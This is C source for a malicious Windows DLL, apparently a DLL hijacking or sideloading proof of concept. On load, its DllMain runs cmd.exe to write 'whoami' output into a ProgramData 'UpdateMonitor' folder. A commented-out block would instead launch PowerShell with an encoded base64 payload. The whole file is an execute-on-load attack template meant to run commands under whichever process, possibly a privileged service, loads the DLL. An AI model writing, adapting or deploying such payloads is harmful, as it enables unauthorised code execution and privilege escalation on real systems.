#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            // First test this, THIS SHOULD WORK
            system("C:\\Windows\\System32\\cmd.exe /c \"whoami > C:\\ProgramData\\UpdateMonitor\\whoami.txt\"");

            // CreateProcessA(
            //   "C:\\Windows\\System32\\cmd.exe",
            //   "/c powershell -e \"<base64 blob>\"",
            //   NULL, NULL, FALSE, 0, NULL, NULL, NULL, NULL
            // );
            break;
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        default:
            break;
    }
    return TRUE;
}

